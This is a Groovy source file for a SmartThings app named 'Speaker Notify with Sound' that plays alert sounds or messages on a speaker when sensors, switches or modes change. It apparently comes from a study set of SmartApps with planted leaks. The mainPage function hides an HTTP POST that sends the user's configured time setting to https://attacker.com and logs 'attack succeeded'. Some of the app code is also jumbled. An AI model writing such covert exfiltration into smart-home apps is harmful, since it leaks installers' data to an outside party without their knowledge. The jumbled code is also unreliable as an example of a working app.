
definition(
    name:"Speaker Notify with Sound",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Play a sound or custom message through your Speaker when the mode changes or other events occur.",
    category:"SmartThings Labs",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Partner/sonos.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Partner/sonos@2 x.png"
)

preferences{
    page(name:"mainPage",title:"Play a message on your Speaker when something happens",install:true,uninstall:true)
    page(name:"chooseTrack",title:"Select a song or station")
    page(name:"timeIntervalInput",title:"Only during a certain time"){
        section{
            input"starting","time",title:"Starting",required:false
            input"ending","time",title:"Ending",required:false
            }
        }
}

def mainPage(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(anythingSet){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${starting}"
        ]
        ]
        section("Play message when"){
            ifSet"motion","capability.motionSensor",title:"Motion Here",required:false,multiple:true
            ifSet"contact","capability.contactSensor",title:"Contact Opens",required:false,multiple:true
            ifSet"contactClosed","capability.contactSensor",title:"Contact Closes",required:false,multiple:true
            ifSet"acceleration","capability.accelerationSensor",title:"Acceleration Detected",required:false,multiple:true
            ifSet"mySwitch","capability.switch",title:"Switch Turned On",required:false,multiple:true
            ifSet"mySwitchOff","capability.switch",title:"Switch Turned Off",required:false,multiple:true
            ifSet"arrivalPresence","capability.presenceSensor",title:"Arrival Of",required:false,multiple:true
            ifSet"departurePresence","capability.presenceSensor",title:"Departure Of",required:false,multiple:true
            ifSet"smoke","capability.smokeDetector",title:"Smoke Detected",required:false,multiple:true
            ifSet"water","capability.waterSensor",title:"Water Sensor Wet",required:false,multiple:true
            ifSet"button1","capability.button",title:"Button Press",required:false,multiple:true
            ifSet"triggerModes","mode",title:"System Changes Mode",required:false,multiple:true
            ifSet"timeOfDay","time",title:"At a Scheduled Time",required:false
            }
    }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def chooseTrack(){
    dynamicPage(name:"chooseTrack"){
        section{
            input"song","enum",title:"Play this track",required:true,multiple:false,options:songOptions()
            }
        }
}

private songOptions(){
    
    
    
    def options=new LinkedHashSet()
    if(state.selectedSong?.station){
        options<<state.selectedSong.station
    }
    else if(state.selectedSong?.description){
            
            options<<state.selectedSong.description
        }
    
    
    def states=sonos.statesSince("trackData",new Date(0),[max:30])
    def dataMaps=states.collect{it.jsonValue}
    options.addAll(dataMaps.collect{it.station})
    
    log.trace"${options.size()}songs in list"
    options.take(20)as List
}

private saveSelectedSong(){
    try{
        def thisSong=song
        log.info"Looking for$thisSong"
        def songs=sonos.statesSince("trackData",new Date(0),[max:30]).collect{it.jsonValue}
        log.info"Searching${songs.size()}records"
        
        def data=songs.find{s->s.station==thisSong}
        log.info"Found${data?.station}"
        if(data){
            state.selectedSong=data
            log.debug"Selected song=$state.selectedSong"
        }
        else if(song==state.selectedSong?.station){
                log.debug"Selected existing entry'$song',which is no longer in the last 20 list"
            }
            else{
                    log.warn"Selected song'$song'not found"
                }
    }
    catch(Throwable t){
        log.error t
    }
}

private anythingSet(){
    for(name in["motion","contact","contactClosed","acceleration","mySwitch","mySwitchOff","arrivalPresence","departurePresence","smoke","water","button1","timeOfDay","triggerModes","timeOfDay"]){
        if(settings[name]){
            return true
        }
    }
    return false
}

private ifUnset(Map options,String name,String capability){
    if(!settings[name]){
        input(options,name,capability)
        }
}

private ifSet(Map options,String name,String capability){
    if(settings[name]){
        input(options,name,capability)
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    subscribeToEvents()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    unsubscribe()
    unschedule()
    subscribeToEvents()
}

def subscribeToEvents(){
    subscribe(app,appTouchHandler)
    subscribe(contact,"contact.open",eventHandler)
    subscribe(contactClosed,"contact.closed",eventHandler)
    subscribe(acceleration,"acceleration.active",eventHandler)
    subscribe(motion,"motion.active",eventHandler)
    subscribe(mySwitch,"switch.on",eventHandler)
    subscribe(mySwitchOff,"switch.off",eventHandler)
    subscribe(arrivalPresence,"presence.present",eventHandler)
    subscribe(departurePresence,"presence.not present",eventHandler)
    subscribe(smoke,"smoke.detected",eventHandler)
    subscribe(smoke,"smoke.tested",eventHandler)
    subscribe(smoke,"carbonMonoxide.detected",eventHandler)
    subscribe(water,"water.wet",eventHandler)
    subscribe(button1,"button.pushed",eventHandler)
    
    if(triggerModes){
        subscribe(location,modeChangeHandler)
    }
    
    if(timeOfDay){
        schedule(timeOfDay,scheduledTimeHandler)
    }
    
    if(song){
        saveSelectedSong()
    }
    
    loadText()
}

def eventHandler(evt){
    log.trace"eventHandler($evt?.name:$evt?.value)"
    if(allOk){
        log.trace"allOk"
        def lastTime=state[frequencyKey(evt)]
        if(oncePerDayOk(lastTime)){
            if(frequency){
                if(lastTime==null||now()-lastTime>=frequency*60000){
                    takeAction(evt)
                }
                else{
                        log.debug"Not taking action because$frequency minutes have not elapsed since last action"
                    }
            }
            else{
                    takeAction(evt)
                }
        }
        else{
                log.debug"Not taking action because it was already taken today"
            }
    }
}
def modeChangeHandler(evt){
    log.trace"modeChangeHandler$evt.name:$evt.value($triggerModes)"
    if(evt.value in triggerModes){
        eventHandler(evt)
    }
}

def scheduledTimeHandler(){
    eventHandler(null)
}

def appTouchHandler(evt){
    takeAction(evt)
}

private takeAction(evt){
    
    log.trace"takeAction()"
    
    if(song){
        sonos.playSoundAndTrack(state.sound.uri,state.sound.duration,state.selectedSong,volume)
    }
    else if(resumePlaying){
            sonos.playTrackAndResume(state.sound.uri,state.sound.duration,volume)
        }
        else{
                sonos.playTrackAndRestore(state.sound.uri,state.sound.duration,volume)
            }
    
    if(frequency||oncePerDay){
        state[frequencyKey(evt)]=now()
    }
    log.trace"Exiting takeAction()"
}

private frequencyKey(evt){
    "lastActionTimeStamp"
}

private dayString(Date date){
    def df=new java.text.SimpleDateFormat("yyyy-MM-dd")
    if(location.timeZone){
        df.setTimeZone(location.timeZone)
    }
    else{
            df.setTimeZone(TimeZone.getTimeZone("America/New_York"))
        }
    df.format(date)
}

private oncePerDayOk(Long lastTime){
    def result=true
    if(oncePerDay){
        result=lastTime?dayString(new Date())!=dayString(new Date(lastTime)):true
        log.trace"oncePerDayOk=$result"
    }
    result
}


private getAllOk(){
    modeOk&&daysOk&&timeOk
}

private getModeOk(){
    def result=!modes||modes.contains(location.mode)
    log.trace"modeOk=$result"
    result
}

private getDaysOk(){
    def result=true
    if(days){
        def df=new java.text.SimpleDateFormat("EEEE")
        if(location.timeZone){
            df.setTimeZone(location.timeZone)
        }
        else{
                df.setTimeZone(TimeZone.getTimeZone("America/New_York"))
            }
        def day=df.format(new Date())
        result=days.contains(day)
    }
    log.trace"daysOk=$result"
    result
}

private getTimeOk(){
    def result=true
    if(starting&&ending){
        def currTime=now()
        def start=timeToday(starting,location?.timeZone).time
        def stop=timeToday(ending,location?.timeZone).time
        result=start<stop?currTime>=start&&currTime<=stop:currTime<=stop||currTime>=start
    }
    log.trace"timeOk=$result"
    result
}

private hhmm(time,fmt="h:mm a")
{
    def t=timeToday(time,location.timeZone)
    def f=new java.text.SimpleDateFormat(fmt)
    f.setTimeZone(location.timeZone?:timeZone(time))
    f.format(t)
}

private getTimeLabel()
{
    (starting&&ending)?hhmm(starting)+"-"+hhmm(ending,"h:mm a z"):""
}


private loadText(){
    switch(actionType){
        case"Bell 1":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/bell1.mp3",duration:"10"]
            break;
            case"Bell 2":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/bell2.mp3",duration:"10"]
            break;
            case"Dogs Barking":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/dogs.mp3",duration:"10"]
            break;
            case"Fire Alarm":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/alarm.mp3",duration:"17"]
            break;
            case"The mail has arrived":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/the+mail+has+arrived.mp3",duration:"1"]
            break;
            case"A door opened":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/a+door+opened.mp3",duration:"1"]
            break;
            case"There is motion":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/there+is+motion.mp3",duration:"1"]
            break;
            case"Smartthings detected a flood":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/smartthings+detected+a+flood.mp3",duration:"2"]
            break;
            case"Smartthings detected smoke":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/smartthings+detected+smoke.mp3",duration:"1"]
            break;
            case"Someone is arriving":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/someone+is+arriving.mp3",duration:"1"]
            break;
            case"Piano":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/piano2.mp3",duration:"10"]
            break;
            case"Lightsaber":
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/lightsaber.mp3",duration:"10"]
            break;
            case"Custom Message":
            if(message){
                state.sound=textToSpeech(message instanceof List?message[0]:message)
            }
            else{
                    state.sound=textToSpeech("You selected the custom message option but did not enter a message in the$app.label Smart App")
                }
            break;
            default:
            state.sound=[uri:"http://s3.amazonaws.com/smartapp-media/sonos/bell1.mp3",duration:"10"]
            break;
            }
}

